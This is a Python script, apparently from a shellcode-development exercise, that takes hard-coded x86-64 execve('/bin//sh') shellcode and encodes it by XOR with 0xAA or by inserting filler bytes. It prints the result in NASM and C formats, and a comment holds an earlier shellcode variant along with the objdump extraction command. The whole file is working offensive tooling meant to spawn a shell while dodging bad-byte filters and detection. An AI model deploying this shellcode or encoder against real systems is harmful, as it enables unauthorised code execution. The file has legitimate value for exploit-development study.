#!/usr/bin/env python3
import sys

# for i in $(objdump -d 29-execve.o -M intel |grep "^ " |cut -f2); do echo -n '\x'$i; done;echo
# shellcode = "\xeb\x1d\x48\x31\xc0\x5f\x88\x67\x07\x48\x89\x7f\x08\x48\x89\x47\x10\x48\x8d\x77\x08\x48\x8d\x57\x10\x48\x83\xc0\x3b\x0f\x05\xe8\xde\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x41\x42\x42\x42\x42\x42\x42\x42\x42\x43\x43\x43\x43\x43\x43\x43\x43"

shellcode = "\x48\x31\xc0\x48\x83\xc0\x3b\x48\x31\xdb\x53\x48\xb9\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x51\x48\x31\xc9\x48\x89\xe7\x53\x48\x89\xe2\x57\x48\x89\xe6\x0f\x05"

encoded_shellcode = []


if sys.argv[1] == 'xor':

    key = "\xAA"
    for i in shellcode:
        encoded_byte = ord(i)^ord(key)
        if encoded_byte == 0:
            print("WARNING: null byte included in resulting shellcode")
            sys.exit()
        encoded_shellcode.append(encoded_byte)


elif sys.argv[1] == 'ins':
    
    for i in shellcode:
        if i == 0:
            print("WARNING: null byte included in resulting shellcode")
            sys.exit()
        encoded_shellcode.append(ord(i))
        encoded_shellcode.append(ord("\xaa"))
    encoded_shellcode = encoded_shellcode[:-1]
    encoded_shellcode.append(ord("\xbb"))

else:
    sys.exit("Dunno what to do")

print(f"Size of shellcode: {len(encoded_shellcode)}")

print("Nasm format:")
print(",".join([hex(i) for i in encoded_shellcode]))

print("C format:")
print("".join([hex(i).replace('0x','\\x') for i in encoded_shellcode]))

